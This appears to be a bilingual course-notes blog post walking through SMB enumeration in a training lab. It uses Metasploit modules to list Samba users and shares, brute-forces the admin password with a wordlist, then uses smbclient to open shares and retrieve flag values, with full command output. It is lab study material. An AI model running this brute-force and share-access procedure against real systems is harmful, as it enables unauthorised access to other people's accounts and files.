---
layout: post
title: "SMB Enumeration"
date: "2022-12-06"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - The Metasploit Framework (MSF)
---

# SMB Enumeration
SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a local network (LAN).

SMB uses port 445 (TCP). However, originally, SMB ran on top of NetBIOS using port 139.

SAMBA is the Linux implementation of SMB, and allows Windows system to access Linux shares and devices.

We can utilize auxiliary modules to enumerate the SMB version, shares, users and perform a brute-force attack in order to identify users and passwords.

# SMB 枚举
SMB（服务器消息块）是一种网络文件共享协议，用于促进本地网络 (LAN) 上的计算机之间共享文件和外围设备。

SMB 使用端口 445 (TCP)。 然而，最初，SMB 使用端口 139 在 NetBIOS 之上运行。

SAMBA 是 SMB 的 Linux 实现，允许 Windows 系统访问 Linux 共享和设备。

我们可以利用辅助模块来枚举 SMB 版本、共享、用户并执行暴力攻击以识别用户和密码。

# Demo: SMB Enumeration（演示：SMB 枚举）
So if you've ever worked on a Windows environment, where one or more Windows computers are connected to each other locally, then you should be familiar with SMB. An example of this would be when you are trying to set up a file share so that you can share files from your PC to other PCs on the network. And this is all facilitated through SMB. Another example of this is if you want to set up a share or you want to allow other users on a network to access a printer that is connected to your PC. This is handled and facilitated by SMB.

Originally on older versions of Windows SMB ran on top of the NetBIOS protocol using port 139 and was available on both 139 and 445. However, on newer versions of Windows and in modern networks SMB is usually found on port 445 on TCP stack.

```
ifconfig
eth1: 192.91.46.2
```

```
service postgresql start
msfconsole
```

Add a new workspace for our activity.

```
workspace -a SMB_ENUM
```

Set up a global variable for the target IP. This IP will be set for the RHOSTS variable with whichever module that we use. 

```
set RHOSTS 192.91.46.3
```

```
search type:auxiliary name:smb
```

Identify the version of SMB that is running on the target.

[SMB Version Detection](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_version/)

SMB 版本检测

指纹并显示有关 SMB 服务器的版本信息。将报告协议信息和主机操作系统（如果可用）。主机操作系统检测要求远程服务器支持 SMB 协议版本 1。压缩和加密能力协商仅出现在版本 3.1.1 中。

```
use auxiliary/scanner/smb/smb_version
show options
run
```

Enumerate users.

[SMB User Enumeration (SAM EnumUsers)](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_enumusers/)

SMB 用户枚举 (SAM EnumUsers)

通过 SAM RPC 服务确定存在哪些本地用户

```
use auxiliary/scanner/smb/smb_enumusers
info
run
```

Enumerate shares. Shares could potentially allow us to access files that have been shared on this particular SMB server. And these files could potentially be useful in gaining access to the target system. 

[SMB Share Enumeration](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_enumshares/)

SMB 共享枚举

该模块确定 SMB 服务提供哪些共享以及哪些共享是可读/可写的。它还收集其他信息，如共享类型、目录、文件、时间戳等。默认情况下，RubySMB net_share_enum_all 请求完成以检索使用 SRVSVC 的共享信息。

```
use auxiliary/scanner/smb/smb_enumshares
show options
set ShowFiles true
```

Perform a brute force in order to identify the password for the user admin. And that will consequently give us access to all of these shares.

SMB 登录检查扫描仪

该模块将在一系列机器上测试 SMB 登录并报告成功登录。如果您加载了数据库插件并连接到数据库，此模块将记录成功的登录和主机，以便您可以跟踪您的访问。

```
search smb_login
use auxiliary/scanner/smb/smb_login
show options
set SMBUser admin
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
exit
```

Check out the various shares and access the files within these shares.

`-L`: list out the shares.

```
smbclient -L \\\\192.91.46.3\\ -U admin
```

Access any of these shares.

```
smbclient \\\\192.91.46.3\public -U admin

smb: \> ls
smb: \> cd secret
smb: \> ls
smb: \> get flag
smb: \> exit

ls
cat flag
```

List out the shares again.

```
smbclient -L \\\\192.91.46.3\\ -U admin
```

Access the share for aisha.

```
smbclient \\\\192.91.46.3\\aisha -U admin

smb: \> ls
smb: \> cd dir
smb: \> ls
smb: \> exit
``` 

We were able to enumerate the SMB version. We were also able to enumerate the users as well as the shares. And furthermore, we were able to perform a brute force attack in order to identify the password for the admin user. That information has allowed us to gain access to shares that we pretty much would not have been able to access if we didn't have the admin user's password.

# Samba Recon: Basics
```
root@attackdefense:~# ifconfig
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.238.101.2  netmask 255.255.255.0  broadcast 192.238.101.255
        ether 02:42:c0:ee:65:02  txqueuelen 0  (Ethernet)
```

```
root@attackdefense:~# service postgresql start
[ ok ] Starting PostgreSQL 11 database server: main.
root@attackdefense:~# msfconsole -q
msf5 > workspace
* default
msf5 > workspace -a SMB_ENUM
[*] Added workspace: SMB_ENUM
[*] Workspace: SMB_ENUM
msf5 > workspace
  default
* SMB_ENUM
msf5 > setg RHOSTS 192.238.101.3
RHOSTS => 192.238.101.3
```

```
msf5 > search type:auxiliary name:smb

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank    Check  Description
   -   ----                                                        ---------------  ----    -----  -----------
   1   auxiliary/admin/oracle/ora_ntlm_stealer                     2009-04-07       normal  No     Oracle SMB Relay Code Execution
   2   auxiliary/admin/smb/check_dir_file                                           normal  Yes    SMB Scanner Check File/Directory Utility
   3   auxiliary/admin/smb/delete_file                                              normal  Yes    SMB File Delete Utility
   4   auxiliary/admin/smb/download_file                                            normal  Yes    SMB File Download Utility
   5   auxiliary/admin/smb/list_directory                                           normal  No     SMB Directory Listing Utility
   6   auxiliary/admin/smb/ms17_010_command                        2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   7   auxiliary/admin/smb/upload_file                                              normal  Yes    SMB File Upload Utility
   8   auxiliary/dos/smb/smb_loris                                 2017-06-29       normal  No     SMBLoris NBSS Denial of Service
   9   auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                    normal  No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   10  auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                       normal  No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
   11  auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                   normal  No     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop
   12  auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                     normal  No     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS
   13  auxiliary/dos/windows/smb/vista_negotiate_stop                               normal  No     Microsoft Vista SP0 SMB Negotiate Protocol DoS
   14  auxiliary/fileformat/multidrop                                               normal  No     Windows SMB Multi Dropper
   15  auxiliary/fuzzers/smb/smb2_negotiate_corrupt                                 normal  No     SMB Negotiate SMB2 Dialect Corruption
   16  auxiliary/fuzzers/smb/smb_create_pipe                                        normal  No     SMB Create Pipe Request Fuzzer
   17  auxiliary/fuzzers/smb/smb_create_pipe_corrupt                                normal  No     SMB Create Pipe Request Corruption
   18  auxiliary/fuzzers/smb/smb_negotiate_corrupt                                  normal  No     SMB Negotiate Dialect Corruption
   19  auxiliary/fuzzers/smb/smb_ntlm1_login_corrupt                                normal  No     SMB NTLMv1 Login Request Corruption
   20  auxiliary/fuzzers/smb/smb_tree_connect                                       normal  No     SMB Tree Connect Request Fuzzer
   21  auxiliary/fuzzers/smb/smb_tree_connect_corrupt                               normal  No     SMB Tree Connect Request Corruption
   22  auxiliary/scanner/sap/sap_smb_relay                                          normal  Yes    SAP SMB Relay Abuse
   23  auxiliary/scanner/smb/pipe_auditor                                           normal  Yes    SMB Session Pipe Auditor
   24  auxiliary/scanner/smb/pipe_dcerpc_auditor                                    normal  Yes    SMB Session Pipe DCERPC Auditor
   25  auxiliary/scanner/smb/smb1                                                   normal  Yes    SMBv1 Protocol Detection
   26  auxiliary/scanner/smb/smb2                                                   normal  Yes    SMB 2.0 Protocol Detection
   27  auxiliary/scanner/smb/smb_enum_gpp                                           normal  Yes    SMB Group Policy Preference Saved Passwords Enumeration
   28  auxiliary/scanner/smb/smb_enumshares                                         normal  Yes    SMB Share Enumeration
   29  auxiliary/scanner/smb/smb_enumusers                                          normal  Yes    SMB User Enumeration (SAM EnumUsers)
   30  auxiliary/scanner/smb/smb_enumusers_domain                                   normal  Yes    SMB Domain User Enumeration
   31  auxiliary/scanner/smb/smb_login                                              normal  Yes    SMB Login Check Scanner
   32  auxiliary/scanner/smb/smb_lookupsid                                          normal  Yes    SMB SID User Enumeration (LookupSid)
   33  auxiliary/scanner/smb/smb_ms17_010                                           normal  Yes    MS17-010 SMB RCE Detection
   34  auxiliary/scanner/smb/smb_version                                            normal  Yes    SMB Version Detection
   35  auxiliary/scanner/snmp/snmp_enumshares                                       normal  Yes    SNMP Windows SMB Share Enumeration
   36  auxiliary/server/capture/smb                                                 normal  No     Authentication Capture: SMB
```

The SMB version is `Samba 4.3.11-Ubuntu`, and the operating system information is incorrect.

```
msf5 > use auxiliary/scanner/smb/smb_version
msf5 auxiliary(scanner/smb/smb_version) > show options

Module options (auxiliary/scanner/smb/smb_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS     192.238.101.3    yes       The target address range or CIDR identifier
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   THREADS    1                yes       The number of concurrent threads

msf5 auxiliary(scanner/smb/smb_version) > run

[*] 192.238.101.3:445     - Host could not be identified: Windows 6.1 (Samba 4.3.11-Ubuntu)
[*] 192.238.101.3:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
msf5 auxiliary(scanner/smb/smb_version) > use auxiliary/scanner/smb/smb_enumusers
msf5 auxiliary(scanner/smb/smb_enumusers) > show options

Module options (auxiliary/scanner/smb/smb_enumusers):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS     192.238.101.3    yes       The target address range or CIDR identifier
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   THREADS    1                yes       The number of concurrent threads

msf5 auxiliary(scanner/smb/smb_enumusers) > run

[+] 192.238.101.3:139     - SAMBA-RECON [ john, elie, aisha, shawn, emma, admin ] ( LockoutTries=0 PasswordMin=5 )
[*] 192.238.101.3:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
msf5 auxiliary(scanner/smb/smb_enumusers) > use auxiliary/scanner/smb/smb_enumshares
msf5 auxiliary(scanner/smb/smb_enumshares) > show options

Module options (auxiliary/scanner/smb/smb_enumshares):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   LogSpider       3                no        0 = disabled, 1 = CSV, 2 = table (txt), 3 = one liner (txt) (Accepted: 0, 1, 2, 3)
   MaxDepth        999              yes       Max number of subdirectories to spider
   RHOSTS          192.238.101.3    yes       The target address range or CIDR identifier
   SMBDomain       .                no        The Windows domain to use for authentication
   SMBPass                          no        The password for the specified username
   SMBUser                          no        The username to authenticate as
   ShowFiles       false            yes       Show detailed information when spidering
   SpiderProfiles  true             no        Spider only user profiles when share = C$
   SpiderShares    false            no        Spider shares recursively
   THREADS         1                yes       The number of concurrent threads

msf5 auxiliary(scanner/smb/smb_enumshares) > set ShowFiles true
ShowFiles => true
msf5 auxiliary(scanner/smb/smb_enumshares) > run

[+] 192.238.101.3:139     - public - (DS) 
[+] 192.238.101.3:139     - john - (DS) 
[+] 192.238.101.3:139     - aisha - (DS) 
[+] 192.238.101.3:139     - emma - (DS) 
[+] 192.238.101.3:139     - everyone - (DS) 
[+] 192.238.101.3:139     - IPC$ - (I) IPC Service (samba.recon.lab)
[*] 192.238.101.3:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
msf5 auxiliary(scanner/smb/smb_enumshares) > use auxiliary/scanner/smb/smb_login
msf5 auxiliary(scanner/smb/smb_login) > ls -l /usr/share/metasploit-framework/data/wordlists
[*] exec: ls -l /usr/share/metasploit-framework/data/wordlists

total 2200
-rw-r--r-- 1 root root    791 Apr 18  2019 adobe_top100_pass.txt
-rw-r--r-- 1 root root    754 Apr 18  2019 av-update-urls.txt
-rw-r--r-- 1 root root   7568 Apr 18  2019 av_hips_executables.txt
-rw-r--r-- 1 root root   7418 Apr 18  2019 burnett_top_1024.txt
-rw-r--r-- 1 root root   3585 Apr 18  2019 burnett_top_500.txt
-rw-r--r-- 1 root root     47 Apr 18  2019 can_flood_frames.txt
-rw-r--r-- 1 root root    236 Apr 18  2019 cms400net_default_userpass.txt
-rw-r--r-- 1 root root    444 Feb  7  2019 common_passwords.txt
-rw-r--r-- 1 root root  37000 Apr 18  2019 common_roots.txt
-rw-r--r-- 1 root root     52 Feb  7  2019 common_users.txt
-rw-r--r-- 1 root root  11349 Apr 18  2019 dangerzone_a.txt
-rw-r--r-- 1 root root   2166 Apr 18  2019 dangerzone_b.txt
-rw-r--r-- 1 root root     68 Apr 18  2019 db2_default_pass.txt
-rw-r--r-- 1 root root     41 Apr 18  2019 db2_default_user.txt
-rw-r--r-- 1 root root    124 Apr 18  2019 db2_default_userpass.txt
-rw-r--r-- 1 root root   9323 Apr 18  2019 default_pass_for_services_unhash.txt
-rw-r--r-- 1 root root  23489 Apr 18  2019 default_userpass_for_services_unhash.txt
-rw-r--r-- 1 root root   6819 Apr 18  2019 default_users_for_services_unhash.txt
-rw-r--r-- 1 root root    196 Feb  7  2019 directory.txt
-rw-r--r-- 1 root root    496 Apr 18  2019 dlink_telnet_backdoor_userpass.txt
-rw-r--r-- 1 root root    102 Feb  7  2019 files.txt
-rw-r--r-- 1 root root   1354 Apr 18  2019 hci_oracle_passwords.csv
-rw-r--r-- 1 root root    126 Apr 18  2019 http_default_pass.txt
-rw-r--r-- 1 root root    170 Apr 18  2019 http_default_userpass.txt
-rw-r--r-- 1 root root     99 Apr 18  2019 http_default_users.txt
-rw-r--r-- 1 root root    100 Apr 18  2019 http_owa_common.txt
-rw-r--r-- 1 root root     23 Apr 18  2019 idrac_default_pass.txt
-rw-r--r-- 1 root root     17 Apr 18  2019 idrac_default_user.txt
-rw-r--r-- 1 root root   8670 Apr 18  2019 ipmi_passwords.txt
-rw-r--r-- 1 root root     50 Apr 18  2019 ipmi_users.txt
-rw-r--r-- 1 root root  50338 Apr 18  2019 joomla.txt
-rw-r--r-- 1 root root    177 Apr 18  2019 keyboard-patterns.txt
-rw-r--r-- 1 root root     84 Apr 18  2019 lync_subdomains.txt
-rw-r--r-- 1 root root  69823 Apr 18  2019 malicious_urls.txt
-rw-r--r-- 1 root root    306 Apr 18  2019 mirai_pass.txt
-rw-r--r-- 1 root root    115 Apr 18  2019 mirai_user.txt
-rw-r--r-- 1 root root    768 Apr 18  2019 mirai_user_pass.txt
-rw-r--r-- 1 root root    383 Apr 18  2019 multi_vendor_cctv_dvr_pass.txt
-rw-r--r-- 1 root root     11 Apr 18  2019 multi_vendor_cctv_dvr_users.txt
-rw-r--r-- 1 root root    281 Apr 18  2019 named_pipes.txt
-rw-r--r-- 1 root root  11966 Apr 18  2019 namelist.txt
-rw-r--r-- 1 root root  16767 Apr 18  2019 oracle_default_hashes.txt
-rw-r--r-- 1 root root  59294 Apr 18  2019 oracle_default_passwords.csv
-rw-r--r-- 1 root root   7681 Apr 18  2019 oracle_default_userpass.txt
-rw-r--r-- 1 root root 820321 Apr 18  2019 password.lst
-rw-r--r-- 1 root root  12098 Apr 18  2019 piata_ssh_userpass.txt
-rw-r--r-- 1 root root     31 Apr 18  2019 postgres_default_pass.txt
-rw-r--r-- 1 root root     22 Apr 18  2019 postgres_default_user.txt
-rw-r--r-- 1 root root     78 Apr 18  2019 postgres_default_userpass.txt
-rw-r--r-- 1 root root    644 Apr 18  2019 root_userpass.txt
-rw-r--r-- 1 root root   7023 Apr 18  2019 routers_userpass.txt
-rw-r--r-- 1 root root  17095 Apr 18  2019 rpc_names.txt
-rw-r--r-- 1 root root     36 Apr 18  2019 rservices_from_users.txt
-rw-r--r-- 1 root root    117 Apr 18  2019 sap_common.txt
-rw-r--r-- 1 root root    448 Apr 18  2019 sap_default.txt
-rw-r--r-- 1 root root  13719 Apr 18  2019 sap_icm_paths.txt
-rw-r--r-- 1 root root    816 Apr 18  2019 scada_default_userpass.txt
-rw-r--r-- 1 root root    217 Apr 18  2019 sensitive_files.txt
-rw-r--r-- 1 root root    176 Apr 18  2019 sensitive_files_win.txt
-rw-r--r-- 1 root root   3838 Apr 18  2019 sid.txt
-rw-r--r-- 1 root root    844 Apr 18  2019 snmp_default_pass.txt
-rw-r--r-- 1 root root   3426 Apr 18  2019 tftp.txt
-rw-r--r-- 1 root root     47 Apr 18  2019 tomcat_mgr_default_pass.txt
-rw-r--r-- 1 root root    132 Apr 18  2019 tomcat_mgr_default_userpass.txt
-rw-r--r-- 1 root root     37 Apr 18  2019 tomcat_mgr_default_users.txt
-rw-r--r-- 1 root root   7883 Apr 18  2019 unix_passwords.txt
-rw-r--r-- 1 root root    781 Apr 18  2019 unix_users.txt
-rw-r--r-- 1 root root      9 Apr 18  2019 vnc_passwords.txt
-rw-r--r-- 1 root root 575885 Apr 18  2019 vxworks_collide_20.txt
-rw-r--r-- 1 root root 229871 Apr 18  2019 vxworks_common_20.txt
```

Brute for the password of user `admin`, use `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt` dictionary.

```
msf5 auxiliary(scanner/smb/smb_login) > show options

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS             192.238.101.3    yes       The target address range or CIDR identifier
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts

msf5 auxiliary(scanner/smb/smb_login) > set SMBUser admin
SMBUser => admin
msf5 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf5 auxiliary(scanner/smb/smb_login) > run

[*] 192.238.101.3:445     - 192.238.101.3:445 - Starting SMB login bruteforce
[-] 192.238.101.3:445     - 192.238.101.3:445 - Failed: '.\admin:admin',
[-] 192.238.101.3:445     - 192.238.101.3:445 - Failed: '.\admin:123456',
[-] 192.238.101.3:445     - 192.238.101.3:445 - Failed: '.\admin:12345',
[-] 192.238.101.3:445     - 192.238.101.3:445 - Failed: '.\admin:123456789',
[+] 192.238.101.3:445     - 192.238.101.3:445 - Success: '.\admin:password'
[*] 192.238.101.3:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

List out the shares using `admin` user.

```
root@attackdefense:~# smbclient -L \\\\192.238.101.3\\ -U admin
Enter WORKGROUP\admin's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      
        john            Disk      
        aisha           Disk      
        emma            Disk      
        everyone        Disk      
        IPC$            IPC       IPC Service (samba.recon.lab)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        RECONLABS            SAMBA-RECON
```

Interact with share public.

```
root@attackdefense:~# smbclient \\\\192.238.101.3\\public -U admin
Enter WORKGROUP\admin's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Nov 27 13:36:13 2018
  ..                                  D        0  Tue Nov 27 13:36:13 2018
  dev                                 D        0  Tue Nov 27 13:36:13 2018
  secret                              D        0  Tue Nov 27 13:36:13 2018

                1981084628 blocks of size 1024. 52522312 blocks available
smb: \> cd secret\
smb: \secret\> ls
  .                                   D        0  Tue Nov 27 13:36:13 2018
  ..                                  D        0  Tue Nov 27 13:36:13 2018
  flag                                N       33  Tue Nov 27 13:36:13 2018

                1981084628 blocks of size 1024. 52522416 blocks available
smb: \secret\> get flag 
getting file \secret\flag of size 33 as flag (32.2 KiloBytes/sec) (average 32.2 KiloBytes/sec)
smb: \secret\> exit
root@attackdefense:~# ls
README  flag  tools  wordlists
root@attackdefense:~# cat flag 
03ddb97933e716f5057a18632badb3b4
```

List out the shares again.

```
root@attackdefense:~# smbclient -L \\\\192.238.101.3\\ -U admin
Enter WORKGROUP\admin's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      
        john            Disk      
        aisha           Disk      
        emma            Disk      
        everyone        Disk      
        IPC$            IPC       IPC Service (samba.recon.lab)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        RECONLABS            SAMBA-RECON
```

Access share aisha.

```
root@attackdefense:~# smbclient \\\\192.238.101.3\\aisha -U admin
Enter WORKGROUP\admin's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Nov 27 13:36:13 2018
  ..                                  D        0  Tue Nov 27 13:36:13 2018
  dir                                 D        0  Tue Nov 27 13:36:13 2018

                1981084628 blocks of size 1024. 52518536 blocks available
smb: \> cd dir\
smb: \dir\> ls
  .                                   D        0  Tue Nov 27 13:36:13 2018
  ..                                  D        0  Tue Nov 27 13:36:13 2018
  flag                                N       33  Tue Nov 27 13:36:13 2018

                1981084628 blocks of size 1024. 52518572 blocks available
smb: \dir\> get flag 
getting file \dir\flag of size 33 as flag (32.2 KiloBytes/sec) (average 32.2 KiloBytes/sec)
smb: \dir\> exit
root@attackdefense:~# cat flag 
a1157f23d040fb4bc6f9a7277de65bf7
```

## solution
The solution for this lab can be found in the following manual: https://assets.ine.com/labs/ad-manuals/walkthrough-553.pdf